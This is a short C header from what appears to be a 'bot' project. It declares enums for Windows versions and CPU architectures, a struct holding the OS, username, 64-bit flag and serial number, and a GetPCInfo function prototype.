#pragma once
#include "../common/bot_structs.h"

enum OS_LIST
{
	WINDOWS_2000 = 0,
	WINDOWS_XP = 1,
	WINDOWS_VISTA = 2,
	WINDOWS_7 = 3,
	WINDOWS_8 = 4,
	WINDOWS_8_1 = 5,
	WINDOWS_10 = 6,
	WINDOWS_SERVER_2000 = 7,	
	WINDOWS_SERVER_2003 = 8,
	WINDOWS_SERVER_2008 = 9,
	WINDOWS_SERVER_2012 = 10,
	WINDOWS_SERVER_2016 = 11
};

enum ARCHITECTURE_LIST
{
	ARCITECTURE_X86 = 0,
	ARCHITECTURE_X64 = 1
};

typedef struct
{
	//Operating system of running computer
	unsigned int iOS;

	LPSTR pszUsername;
	BOOL Is64Bit;
	DWORD dwSerialNumber;
}pc_info_t;

pc_info_t WINAPI GetPCInfo(void);